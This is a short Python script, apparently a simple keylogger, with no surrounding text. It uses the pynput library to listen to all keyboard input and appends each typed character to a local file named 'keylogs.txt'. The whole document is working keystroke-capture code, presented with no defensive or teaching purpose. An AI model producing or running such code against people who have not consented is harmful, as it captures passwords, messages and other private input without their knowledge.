from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open('keylogs.txt','a') as keylog:
        try:
            char = key.char
            keylog.write(char)
        except:
            print('error occured')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
